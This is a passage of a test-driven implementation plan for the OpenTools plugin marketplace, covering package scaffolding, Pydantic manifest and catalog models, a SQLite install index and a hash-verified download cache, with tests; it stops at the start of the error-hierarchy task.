# Phase 3E: Plugin Marketplace Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a plugin marketplace system that enables discovery, installation, sandboxed execution, and team sharing of community-contributed security skill/recipe/container bundles via the CLI.

**Architecture:** A new `packages/plugin-core/` library contains all marketplace logic (models, registry client, resolver, installer, sandbox, compose generator, SQLite index, sigstore verification). The CLI (`packages/cli/`) adds a thin `opentools plugin` Typer sub-app wrapping the core. Storage lives in `~/.opentools/plugins/` with a version-directory model and `.active` pointer files for atomic rollback. A Git-based registry serves a signed static catalog fetched with ETag caching via httpx.

**Tech Stack:** `pydantic` v2 (manifest/catalog models), `httpx` (async catalog fetch), `sigstore` (keyless verification), `filelock` (concurrent install protection), `rich` (terminal output), `shlex` (recipe command parsing), `hypothesis` (property-based fuzz tests).

**Spec:** `docs/superpowers/specs/2026-04-15-phase3e-plugin-marketplace-design.md`

---

## File Map

### New files (plugin-core package)

| File | Responsibility |
|---|---|
| `packages/plugin-core/pyproject.toml` | Package metadata, hatchling build, deps |
| `packages/plugin-core/src/opentools_plugin_core/__init__.py` | Public API re-exports |
| `packages/plugin-core/src/opentools_plugin_core/models.py` | Pydantic v2 manifest, catalog, registry entry models |
| `packages/plugin-core/src/opentools_plugin_core/errors.py` | `PluginError` hierarchy with hint system |
| `packages/plugin-core/src/opentools_plugin_core/index.py` | SQLite installed-plugin tracking + integrity hashes |
| `packages/plugin-core/src/opentools_plugin_core/cache.py` | Content-addressable tarball cache |
| `packages/plugin-core/src/opentools_plugin_core/sandbox.py` | Mount blocklist, capability checks, org policy |
| `packages/plugin-core/src/opentools_plugin_core/enforcement.py` | Recipe command shlex parsing, shell operator rejection |
| `packages/plugin-core/src/opentools_plugin_core/content_advisor.py` | Skill regex red-flag scanning (advisory) |
| `packages/plugin-core/src/opentools_plugin_core/compose.py` | Per-plugin compose project generation with sandbox injection |
| `packages/plugin-core/src/opentools_plugin_core/verify.py` | Sigstore signature verification |
| `packages/plugin-core/src/opentools_plugin_core/registry.py` | Catalog fetch, ETag caching, multi-registry, offline fallback |
| `packages/plugin-core/src/opentools_plugin_core/resolver.py` | Dependency tree resolution, conflict/cycle detection |
| `packages/plugin-core/src/opentools_plugin_core/installer.py` | Transactional install pipeline |
| `packages/plugin-core/src/opentools_plugin_core/updater.py` | Version checking, update flow, rollback |

### New test files (plugin-core)

| File | Tests for |
|---|---|
| `packages/plugin-core/tests/__init__.py` | Package marker |
| `packages/plugin-core/tests/conftest.py` | Shared fixtures (tmp dirs, sample manifests) |
| `packages/plugin-core/tests/test_models.py` | Manifest/catalog validation |
| `packages/plugin-core/tests/test_errors.py` | Error hierarchy |
| `packages/plugin-core/tests/test_index.py` | SQLite CRUD + integrity |
| `packages/plugin-core/tests/test_cache.py` | Cache store/retrieve/evict |
| `packages/plugin-core/tests/test_sandbox.py` | Blocklist, capability, org policy |
| `packages/plugin-core/tests/test_enforcement.py` | Command validation, shell op rejection |
| `packages/plugin-core/tests/test_content_advisor.py` | Red-flag scanning |
| `packages/plugin-core/tests/test_compose.py` | Compose generation + sandbox injection |
| `packages/plugin-core/tests/test_verify.py` | Signature verification |
| `packages/plugin-core/tests/test_registry.py` | Catalog fetch, ETag, offline |
| `packages/plugin-core/tests/test_resolver.py` | Linear/diamond/cycle deps |
| `packages/plugin-core/tests/test_installer.py` | Install pipeline stages |
| `packages/plugin-core/tests/test_updater.py` | Update + rollback |

### New files (CLI package)

| File | Responsibility |
|---|---|
| `packages/cli/src/opentools/plugin_cli.py` | Typer sub-app with all 22 `opentools plugin` commands |
| `packages/cli/tests/test_plugin_cli.py` | CLI command tests |

### Modified files (CLI package)

| File | Change |
|---|---|
| `packages/cli/src/opentools/cli.py` | Register `plugin_app` via `app.add_typer()` |
| `packages/cli/src/opentools/plugin.py` | Add `skill_search_paths()` / `recipe_search_paths()` scanning `~/.opentools/plugins/` |
| `packages/cli/src/opentools/containers.py` | `status()` includes plugin containers |
| `packages/cli/pyproject.toml` | Add `opentools-plugin-core` dependency |

---

## Tasks

### Task 1: Package Scaffolding

**Files:**
- Create: `packages/plugin-core/pyproject.toml`
- Create: `packages/plugin-core/src/opentools_plugin_core/__init__.py`
- Create: `packages/plugin-core/tests/__init__.py`
- Create: `packages/plugin-core/tests/conftest.py`
- Test: `packages/plugin-core/tests/test_models.py` (smoke import only)

- [ ] **Step 1: Write the failing test**

```python
# packages/plugin-core/tests/test_models.py
"""Smoke test: ensure package is importable."""


def test_package_importable():
    import opentools_plugin_core
    assert hasattr(opentools_plugin_core, "__version__")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_models.py::test_package_importable -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools_plugin_core'"

- [ ] **Step 3: Write minimal implementation**

```toml
# packages/plugin-core/pyproject.toml
[project]
name = "opentools-plugin-core"
version = "0.1.0"
description = "Plugin marketplace core library for OpenTools"
requires-python = ">=3.12"
dependencies = [
    "pydantic>=2.0",
    "httpx>=0.28",
    "filelock>=3.16",
    "rich>=13.0",
    "ruamel.yaml>=0.18",
]

[project.optional-dependencies]
sigstore = ["sigstore>=3.0"]
dev = [
    "pytest>=8.0",
    "pytest-asyncio>=0.24",
    "hypothesis>=6.100",
]

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.hatch.build.targets.wheel]
packages = ["src/opentools_plugin_core"]

[tool.pytest.ini_options]
testpaths = ["tests"]
pythonpath = ["src"]
```

```python
# packages/plugin-core/src/opentools_plugin_core/__init__.py
"""OpenTools Plugin Marketplace core library."""

__version__ = "0.1.0"
```

```python
# packages/plugin-core/tests/__init__.py
```

```python
# packages/plugin-core/tests/conftest.py
"""Shared fixtures for plugin-core tests."""

from pathlib import Path
import pytest


@pytest.fixture
def tmp_opentools_home(tmp_path: Path) -> Path:
    """Create a temporary ~/.opentools structure."""
    home = tmp_path / ".opentools"
    (home / "plugins").mkdir(parents=True)
    (home / "staging").mkdir()
    (home / "cache").mkdir()
    (home / "registry-cache").mkdir()
    return home


@pytest.fixture
def sample_manifest_dict() -> dict:
    """Minimal valid manifest as a dict."""
    return {
        "name": "test-plugin",
        "version": "1.0.0",
        "description": "A test plugin",
        "author": {"name": "tester"},
        "license": "MIT",
        "min_opentools_version": "0.3.0",
        "tags": ["test"],
        "domain": "pentest",
        "provides": {
            "skills": [{"path": "skills/test-skill/SKILL.md"}],
            "recipes": [],
            "containers": [],
        },
    }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && pip install -e ".[dev]" && python -m pytest tests/test_models.py::test_package_importable -x`
Expected: PASS

- [ ] **Step 5: Commit**

---

### Task 2: Manifest Models

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/models.py`
- Test: `packages/plugin-core/tests/test_models.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_models.py
"""Tests for plugin manifest and catalog Pydantic models."""

import pytest
from pydantic import ValidationError


def test_package_importable():
    import opentools_plugin_core
    assert hasattr(opentools_plugin_core, "__version__")


class TestPluginManifest:
    def test_valid_minimal_manifest(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        m = PluginManifest(**sample_manifest_dict)
        assert m.name == "test-plugin"
        assert m.version == "1.0.0"
        assert m.domain == "pentest"

    def test_manifest_rejects_empty_name(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        sample_manifest_dict["name"] = ""
        with pytest.raises(ValidationError, match="name"):
            PluginManifest(**sample_manifest_dict)

    def test_manifest_rejects_invalid_domain(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        sample_manifest_dict["domain"] = "invalid-domain"
        with pytest.raises(ValidationError, match="domain"):
            PluginManifest(**sample_manifest_dict)

    def test_manifest_accepts_all_domains(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        for domain in ("pentest", "re", "forensics", "cloud", "mobile", "hardware"):
            sample_manifest_dict["domain"] = domain
            m = PluginManifest(**sample_manifest_dict)
            assert m.domain == domain

    def test_manifest_with_full_provides(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        sample_manifest_dict["provides"]["containers"] = [
            {
                "name": "test-mcp",
                "compose_fragment": "containers/test-mcp.yaml",
                "image": "ghcr.io/tester/test-mcp:1.0.0",
                "profile": "pentest",
            }
        ]
        m = PluginManifest(**sample_manifest_dict)
        assert len(m.provides.containers) == 1
        assert m.provides.containers[0].name == "test-mcp"

    def test_manifest_with_requires(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        sample_manifest_dict["requires"] = {
            "containers": ["nmap-mcp"],
            "tools": ["tshark"],
            "plugins": [
                {"name": "network-utils", "version": ">=0.2.0, <1.0.0"}
            ],
        }
        m = PluginManifest(**sample_manifest_dict)
        assert "nmap-mcp" in m.requires.containers
        assert m.requires.plugins[0].name == "network-utils"

    def test_manifest_with_sandbox(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        sample_manifest_dict["sandbox"] = {
            "capabilities": ["NET_RAW", "NET_ADMIN"],
            "network_mode": "host",
            "egress": False,
        }
        m = PluginManifest(**sample_manifest_dict)
        assert "NET_RAW" in m.sandbox.capabilities
        assert m.sandbox.egress is False

    def test_manifest_defaults_sandbox_egress_false(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        m = PluginManifest(**sample_manifest_dict)
        assert m.sandbox.egress is False

    def test_manifest_unknown_fields_ignored(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        sample_manifest_dict["future_field"] = "ignored"
        m = PluginManifest(**sample_manifest_dict)
        assert m.name == "test-plugin"

    def test_manifest_version_string_required(self, sample_manifest_dict):
        from opentools_plugin_core.models import PluginManifest

        del sample_manifest_dict["version"]
        with pytest.raises(ValidationError, match="version"):
            PluginManifest(**sample_manifest_dict)


class TestCatalogEntry:
    def test_valid_catalog_entry(self):
        from opentools_plugin_core.models import CatalogEntry

        entry = CatalogEntry(
            name="wifi-hacking",
            description="WiFi security assessment",
            author="someone",
            trust_tier="verified",
            domain="pentest",
            tags=["wifi", "wireless"],
            latest_version="1.0.0",
            repo="https://github.com/someone/opentools-wifi-hacking",
            min_opentools_version="0.3.0",
            provides={"skills": ["wifi-pentest"], "recipes": [], "containers": []},
            requires={"containers": ["nmap-mcp"], "tools": ["tshark"]},
            yanked_versions=["0.9.0"],
        )
        assert entry.trust_tier == "verified"
        assert "0.9.0" in entry.yanked_versions

    def test_catalog_trust_tier_validation(self):
        from opentools_plugin_core.models import CatalogEntry

        with pytest.raises(ValidationError, match="trust_tier"):
            CatalogEntry(
                name="bad",
                description="x",
                author="x",
                trust_tier="mega-trusted",
                domain="pentest",
                tags=[],
                latest_version="1.0.0",
                repo="https://example.com",
                min_opentools_version="0.3.0",
                provides={"skills": [], "recipes": [], "containers": []},
                requires={},
                yanked_versions=[],
            )


class TestCatalog:
    def test_catalog_parses_plugins_list(self):
        from opentools_plugin_core.models import Catalog

        cat = Catalog(
            generated_at="2026-04-15T12:00:00Z",
            schema_version="1.0.0",
            plugins=[
                {
                    "name": "wifi-hacking",
                    "description": "WiFi tools",
                    "author": "someone",
                    "trust_tier": "verified",
                    "domain": "pentest",
                    "tags": ["wifi"],
                    "latest_version": "1.0.0",
                    "repo": "https://github.com/someone/x",
                    "min_opentools_version": "0.3.0",
                    "provides": {"skills": [], "recipes": [], "containers": []},
                    "requires": {},
                    "yanked_versions": [],
                }
            ],
        )
        assert len(cat.plugins) == 1
        assert cat.plugins[0].name == "wifi-hacking"


class TestRegistryEntry:
    def test_registry_entry_with_versions(self):
        from opentools_plugin_core.models import RegistryEntry, VersionEntry

        entry = RegistryEntry(
            name="wifi-hacking",
            domain="pentest",
            description="WiFi tools",
            author={"name": "someone", "github": "someone",
                     "sigstore_identity": "someone@users.noreply.github.com",
                     "trust_tier": "verified"},
            repo="https://github.com/someone/opentools-wifi-hacking",
            license="MIT",
            tags=["wifi"],
            min_opentools_version="0.3.0",
            provides={"skills": ["wifi-pentest"], "recipes": [], "containers": []},
            requires={"containers": ["nmap-mcp"], "tools": ["tshark"]},
            versions=[
                VersionEntry(version="1.0.0", ref="v1.0.0", sha256="ab3f" * 16),
                VersionEntry(version="0.9.0", ref="v0.9.0", sha256="c7d1" * 16,
                             yanked=True, yank_reason="Docker socket exposed"),
            ],
        )
        assert len(entry.versions) == 2
        assert entry.versions[1].yanked is True
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_models.py -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools_plugin_core.models'"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/models.py
"""Pydantic v2 models for plugin manifests, catalogs, and registry entries."""

from __future__ import annotations

from enum import StrEnum
from typing import Any, Optional

from pydantic import BaseModel, Field, field_validator


# ---------------------------------------------------------------------------
# Enums
# ---------------------------------------------------------------------------


class PluginDomain(StrEnum):
    PENTEST = "pentest"
    RE = "re"
    FORENSICS = "forensics"
    CLOUD = "cloud"
    MOBILE = "mobile"
    HARDWARE = "hardware"


class TrustTier(StrEnum):
    UNVERIFIED = "unverified"
    VERIFIED = "verified"
    TRUSTED = "trusted"
    OFFICIAL = "official"


class InstallMode(StrEnum):
    REGISTRY = "registry"
    LINKED = "linked"
    IMPORTED = "imported"


# ---------------------------------------------------------------------------
# Manifest sub-models
# ---------------------------------------------------------------------------


class Author(BaseModel):
    name: str
    url: Optional[str] = None

    model_config = {"extra": "ignore"}


class SkillProvides(BaseModel):
    path: str

    model_config = {"extra": "ignore"}


class RecipeProvides(BaseModel):
    path: str

    model_config = {"extra": "ignore"}


class ContainerProvides(BaseModel):
    name: str
    compose_fragment: str
    image: str
    profile: Optional[str] = None

    model_config = {"extra": "ignore"}


class Provides(BaseModel):
    skills: list[SkillProvides] = Field(default_factory=list)
    recipes: list[RecipeProvides] = Field(default_factory=list)
    containers: list[ContainerProvides] = Field(default_factory=list)

    model_config = {"extra": "ignore"}


class PluginDependency(BaseModel):
    name: str
    version: str

    model_config = {"extra": "ignore"}


class Requires(BaseModel):
    containers: list[str] = Field(default_factory=list)
    tools: list[str] = Field(default_factory=list)
    plugins: list[PluginDependency] = Field(default_factory=list)

    model_config = {"extra": "ignore"}


class SandboxConfig(BaseModel):
    capabilities: list[str] = Field(default_factory=list)
    network_mode: Optional[str] = None
    egress: bool = False
    egress_domains: list[str] = Field(default_factory=list)
    volumes: list[str] = Field(default_factory=list)

    model_config = {"extra": "ignore"}


# ---------------------------------------------------------------------------
# Plugin Manifest (opentools-plugin.yaml)
# ---------------------------------------------------------------------------


class PluginManifest(BaseModel):
    name: str = Field(..., min_length=1)
    version: str
    description: str
    author: Author
    license: str = "MIT"
    min_opentools_version: str = "0.1.0"
    tags: list[str] = Field(default_factory=list)
    domain: PluginDomain
    changelog: Optional[str] = None
    provides: Provides = Field(default_factory=Provides)
    requires: Requires = Field(default_factory=Requires)
    sandbox: SandboxConfig = Field(default_factory=SandboxConfig)

    model_config = {"extra": "ignore"}


# ---------------------------------------------------------------------------
# Catalog models (registry catalog.json)
# ---------------------------------------------------------------------------


class CatalogEntry(BaseModel):
    name: str
    description: str
    author: str
    trust_tier: TrustTier
    domain: PluginDomain
    tags: list[str] = Field(default_factory=list)
    latest_version: str
    repo: str
    min_opentools_version: str = "0.1.0"
    provides: dict[str, list[str]] = Field(default_factory=dict)
    requires: dict[str, Any] = Field(default_factory=dict)
    yanked_versions: list[str] = Field(default_factory=list)

    model_config = {"extra": "ignore"}


class Catalog(BaseModel):
    generated_at: str
    schema_version: str = "1.0.0"
    plugins: list[CatalogEntry] = Field(default_factory=list)

    model_config = {"extra": "ignore"}


# ---------------------------------------------------------------------------
# Registry entry models (per-plugin YAML in registry repo)
# ---------------------------------------------------------------------------


class VersionEntry(BaseModel):
    version: str
    ref: str
    sha256: str
    yanked: bool = False
    yank_reason: Optional[str] = None
    prerelease: bool = False

    model_config = {"extra": "ignore"}


class RegistryAuthor(BaseModel):
    name: str
    github: Optional[str] = None
    sigstore_identity: Optional[str] = None
    trust_tier: TrustTier = TrustTier.UNVERIFIED

    model_config = {"extra": "ignore"}


class RegistryEntry(BaseModel):
    name: str
    domain: PluginDomain
    description: str
    author: RegistryAuthor
    repo: str
    license: str = "MIT"
    tags: list[str] = Field(default_factory=list)
    min_opentools_version: str = "0.1.0"
    provides: dict[str, list[str]] = Field(default_factory=dict)
    requires: dict[str, Any] = Field(default_factory=dict)
    versions: list[VersionEntry] = Field(default_factory=list)

    model_config = {"extra": "ignore"}


# ---------------------------------------------------------------------------
# Installed plugin record (SQLite row)
# ---------------------------------------------------------------------------


class InstalledPlugin(BaseModel):
    name: str
    version: str
    repo: str
    registry: str
    installed_at: str
    signature_verified: bool
    last_update_check: Optional[str] = None
    mode: InstallMode = InstallMode.REGISTRY


class IntegrityRecord(BaseModel):
    plugin_name: str
    file_path: str
    sha256: str
    recorded_at: str


# ---------------------------------------------------------------------------
# Lockfile and plugin set models
# ---------------------------------------------------------------------------


class LockfileEntry(BaseModel):
    version: str
    registry: str
    repo: str
    ref: str
    sha256: str
    signature_identity: Optional[str] = None


class Lockfile(BaseModel):
    generated_at: str
    opentools_version: str
    plugins: dict[str, LockfileEntry] = Field(default_factory=dict)


class PluginSetEntry(BaseModel):
    version_range: str = "latest"


class PluginSet(BaseModel):
    name: str
    min_opentools_version: str = "0.1.0"
    registries: list[str] = Field(default_factory=list)
    plugins: dict[str, str] = Field(default_factory=dict)
    sandbox_policy: Optional[str] = None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_models.py -x -v`
Expected: PASS (all 14 tests)

- [ ] **Step 5: Commit**

---

### Task 3: Plugin Index (SQLite)

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/index.py`
- Test: `packages/plugin-core/tests/test_index.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_index.py
"""Tests for SQLite plugin index."""

import sqlite3
from datetime import datetime, timezone

import pytest


class TestPluginIndex:
    def test_create_tables(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        # Tables should exist after construction
        conn = sqlite3.connect(str(tmp_opentools_home / "plugins.db"))
        cursor = conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"
        )
        tables = [row[0] for row in cursor.fetchall()]
        conn.close()
        assert "installed_plugins" in tables
        assert "plugin_integrity" in tables

    def test_register_and_get(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex
        from opentools_plugin_core.models import InstalledPlugin

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        plugin = InstalledPlugin(
            name="test-plugin",
            version="1.0.0",
            repo="https://github.com/x/y",
            registry="official",
            installed_at=datetime.now(timezone.utc).isoformat(),
            signature_verified=True,
        )
        idx.register(plugin)
        got = idx.get("test-plugin")
        assert got is not None
        assert got.name == "test-plugin"
        assert got.version == "1.0.0"

    def test_get_nonexistent_returns_none(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        assert idx.get("nope") is None

    def test_list_all(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex
        from opentools_plugin_core.models import InstalledPlugin

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        for name in ("alpha", "beta", "gamma"):
            idx.register(InstalledPlugin(
                name=name, version="1.0.0", repo="https://x.com",
                registry="official",
                installed_at=datetime.now(timezone.utc).isoformat(),
                signature_verified=True,
            ))
        all_plugins = idx.list_all()
        assert len(all_plugins) == 3
        assert {p.name for p in all_plugins} == {"alpha", "beta", "gamma"}

    def test_unregister(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex
        from opentools_plugin_core.models import InstalledPlugin

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        idx.register(InstalledPlugin(
            name="to-remove", version="1.0.0", repo="https://x.com",
            registry="official",
            installed_at=datetime.now(timezone.utc).isoformat(),
            signature_verified=True,
        ))
        idx.unregister("to-remove")
        assert idx.get("to-remove") is None

    def test_record_and_check_integrity(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        idx.record_integrity("test-plugin", "skills/SKILL.md", "abcd1234" * 8)
        hashes = idx.get_integrity("test-plugin")
        assert len(hashes) == 1
        assert hashes[0].file_path == "skills/SKILL.md"
        assert hashes[0].sha256 == "abcd1234" * 8

    def test_unregister_cascades_integrity(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex
        from opentools_plugin_core.models import InstalledPlugin

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        idx.register(InstalledPlugin(
            name="cascade-test", version="1.0.0", repo="https://x.com",
            registry="official",
            installed_at=datetime.now(timezone.utc).isoformat(),
            signature_verified=True,
        ))
        idx.record_integrity("cascade-test", "file.txt", "aaaa" * 16)
        idx.unregister("cascade-test")
        assert idx.get_integrity("cascade-test") == []

    def test_update_version(self, tmp_opentools_home):
        from opentools_plugin_core.index import PluginIndex
        from opentools_plugin_core.models import InstalledPlugin

        idx = PluginIndex(tmp_opentools_home / "plugins.db")
        idx.register(InstalledPlugin(
            name="updatable", version="1.0.0", repo="https://x.com",
            registry="official",
            installed_at=datetime.now(timezone.utc).isoformat(),
            signature_verified=True,
        ))
        idx.update_version("updatable", "2.0.0")
        got = idx.get("updatable")
        assert got.version == "2.0.0"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_index.py -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools_plugin_core.index'"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/index.py
"""SQLite index for tracking installed plugins and file integrity."""

from __future__ import annotations

import sqlite3
from datetime import datetime, timezone
from pathlib import Path

from opentools_plugin_core.models import InstalledPlugin, IntegrityRecord

_SCHEMA = """\
CREATE TABLE IF NOT EXISTS installed_plugins (
    name TEXT PRIMARY KEY,
    version TEXT NOT NULL,
    repo TEXT NOT NULL,
    registry TEXT NOT NULL,
    installed_at TEXT NOT NULL,
    signature_verified BOOLEAN NOT NULL,
    last_update_check TEXT,
    mode TEXT NOT NULL DEFAULT 'registry'
);

CREATE TABLE IF NOT EXISTS plugin_integrity (
    plugin_name TEXT NOT NULL,
    file_path TEXT NOT NULL,
    sha256 TEXT NOT NULL,
    recorded_at TEXT NOT NULL,
    PRIMARY KEY (plugin_name, file_path)
);

CREATE INDEX IF NOT EXISTS idx_integrity_plugin
    ON plugin_integrity(plugin_name);
"""


class PluginIndex:
    """SQLite-backed index of installed plugins."""

    def __init__(self, db_path: Path) -> None:
        self._db_path = Path(db_path)
        self._db_path.parent.mkdir(parents=True, exist_ok=True)
        self._conn = sqlite3.connect(str(self._db_path))
        self._conn.row_factory = sqlite3.Row
        self._conn.executescript(_SCHEMA)

    def close(self) -> None:
        self._conn.close()

    # ── CRUD ────────────────────────────────────────────────────────────

    def register(self, plugin: InstalledPlugin) -> None:
        """Insert or replace an installed plugin record."""
        self._conn.execute(
            "INSERT OR REPLACE INTO installed_plugins "
            "(name, version, repo, registry, installed_at, signature_verified, "
            "last_update_check, mode) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (plugin.name, plugin.version, plugin.repo, plugin.registry,
             plugin.installed_at, plugin.signature_verified,
             plugin.last_update_check, plugin.mode.value),
        )
        self._conn.commit()

    def get(self, name: str) -> InstalledPlugin | None:
        """Fetch a plugin by name, or None."""
        row = self._conn.execute(
            "SELECT * FROM installed_plugins WHERE name = ?", (name,)
        ).fetchone()
        if row is None:
            return None
        return InstalledPlugin(**dict(row))

    def list_all(self) -> list[InstalledPlugin]:
        """Return all installed plugins."""
        rows = self._conn.execute(
            "SELECT * FROM installed_plugins ORDER BY name"
        ).fetchall()
        return [InstalledPlugin(**dict(r)) for r in rows]

    def unregister(self, name: str) -> None:
        """Remove a plugin and its integrity records."""
        self._conn.execute(
            "DELETE FROM plugin_integrity WHERE plugin_name = ?", (name,)
        )
        self._conn.execute(
            "DELETE FROM installed_plugins WHERE name = ?", (name,)
        )
        self._conn.commit()

    def update_version(self, name: str, new_version: str) -> None:
        """Update the version of an installed plugin."""
        self._conn.execute(
            "UPDATE installed_plugins SET version = ? WHERE name = ?",
            (new_version, name),
        )
        self._conn.commit()

    # ── Integrity ───────────────────────────────────────────────────────

    def record_integrity(
        self, plugin_name: str, file_path: str, sha256: str
    ) -> None:
        """Record a file's hash for integrity checking."""
        self._conn.execute(
            "INSERT OR REPLACE INTO plugin_integrity "
            "(plugin_name, file_path, sha256, recorded_at) VALUES (?, ?, ?, ?)",
            (plugin_name, file_path, sha256,
             datetime.now(timezone.utc).isoformat()),
        )
        self._conn.commit()

    def get_integrity(self, plugin_name: str) -> list[IntegrityRecord]:
        """Get all integrity records for a plugin."""
        rows = self._conn.execute(
            "SELECT * FROM plugin_integrity WHERE plugin_name = ?",
            (plugin_name,),
        ).fetchall()
        return [IntegrityRecord(**dict(r)) for r in rows]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_index.py -x -v`
Expected: PASS (all 8 tests)

- [ ] **Step 5: Commit**

---

### Task 4: Content-Addressable Cache

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/cache.py`
- Test: `packages/plugin-core/tests/test_cache.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_cache.py
"""Tests for content-addressable download cache."""

import hashlib

import pytest


class TestPluginCache:
    def test_store_and_retrieve(self, tmp_opentools_home):
        from opentools_plugin_core.cache import PluginCache

        cache = PluginCache(tmp_opentools_home / "cache")
        content = b"fake tarball content for testing"
        sha = hashlib.sha256(content).hexdigest()
        cache.store(sha, content)
        assert cache.has(sha)
        assert cache.retrieve(sha) == content

    def test_retrieve_nonexistent_returns_none(self, tmp_opentools_home):
        from opentools_plugin_core.cache import PluginCache

        cache = PluginCache(tmp_opentools_home / "cache")
        assert cache.retrieve("deadbeef" * 8) is None

    def test_has_false_when_missing(self, tmp_opentools_home):
        from opentools_plugin_core.cache import PluginCache

        cache = PluginCache(tmp_opentools_home / "cache")
        assert cache.has("0000" * 16) is False

    def test_evict(self, tmp_opentools_home):
        from opentools_plugin_core.cache import PluginCache

        cache = PluginCache(tmp_opentools_home / "cache")
        content = b"to be evicted"
        sha = hashlib.sha256(content).hexdigest()
        cache.store(sha, content)
        cache.evict(sha)
        assert not cache.has(sha)

    def test_store_validates_hash(self, tmp_opentools_home):
        from opentools_plugin_core.cache import PluginCache

        cache = PluginCache(tmp_opentools_home / "cache")
        content = b"some data"
        wrong_sha = "0000" * 16
        with pytest.raises(ValueError, match="hash mismatch"):
            cache.store(wrong_sha, content)

    def test_size_bytes(self, tmp_opentools_home):
        from opentools_plugin_core.cache import PluginCache

        cache = PluginCache(tmp_opentools_home / "cache")
        content = b"A" * 1024
        sha = hashlib.sha256(content).hexdigest()
        cache.store(sha, content)
        assert cache.size_bytes() >= 1024

    def test_clear(self, tmp_opentools_home):
        from opentools_plugin_core.cache import PluginCache

        cache = PluginCache(tmp_opentools_home / "cache")
        for i in range(3):
            data = f"data-{i}".encode()
            cache.store(hashlib.sha256(data).hexdigest(), data)
        cache.clear()
        assert cache.size_bytes() == 0
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_cache.py -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools_plugin_core.cache'"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/cache.py
"""Content-addressable download cache for plugin tarballs."""

from __future__ import annotations

import hashlib
from pathlib import Path


class PluginCache:
    """SHA256-addressed file cache at ``~/.opentools/cache/``."""

    def __init__(self, cache_dir: Path) -> None:
        self._dir = Path(cache_dir)
        self._dir.mkdir(parents=True, exist_ok=True)

    def _path(self, sha256: str) -> Path:
        return self._dir / f"{sha256}.tar.gz"

    def store(self, sha256: str, data: bytes) -> Path:
        """Write *data* to cache, verifying hash."""
        actual = hashlib.sha256(data).hexdigest()
        if actual != sha256:
            raise ValueError(
                f"Content hash mismatch: expected {sha256[:16]}..., "
                f"got {actual[:16]}..."
            )
        path = self._path(sha256)
        path.write_bytes(data)
        return path

    def retrieve(self, sha256: str) -> bytes | None:
        """Read cached content or return None."""
        path = self._path(sha256)
        if not path.exists():
            return None
        return path.read_bytes()

    def has(self, sha256: str) -> bool:
        """Check if a hash exists in cache."""
        return self._path(sha256).exists()

    def evict(self, sha256: str) -> None:
        """Remove a single cache entry."""
        path = self._path(sha256)
        if path.exists():
            path.unlink()

    def size_bytes(self) -> int:
        """Total size of all cached files."""
        return sum(f.stat().st_size for f in self._dir.iterdir() if f.is_file())

    def clear(self) -> None:
        """Remove all cached files."""
        for f in self._dir.iterdir():
            if f.is_file():
                f.unlink()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_cache.py -x -v`
Expected: PASS (all 7 tests)

- [ ] **Step 5: Commit**

---

### Task 5: Error Hierarchy

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/errors.py`
- Test: `packages/plugin-core/tests/test_errors.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_errors.py
"""Tests for PluginError hierarchy."""

import pytest


class TestPluginError:
    def test_base_error_is_exception(self):
